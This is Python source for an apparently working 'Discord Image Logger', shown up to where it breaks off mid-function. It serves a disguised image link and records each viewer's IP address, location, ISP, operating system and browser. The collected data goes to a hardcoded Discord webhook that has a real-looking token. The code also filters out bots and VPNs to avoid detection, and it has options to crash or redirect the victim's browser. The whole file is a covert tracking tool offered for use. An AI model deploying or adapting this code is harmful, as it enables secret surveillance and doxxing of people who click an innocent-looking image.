# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1334958204043657216/uEZhxNlFruuu6BGeY0OOEBDOLIA0g2w94q7lzjv-fsAlALpmddxNiUPIcynbz2JMlDDg",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
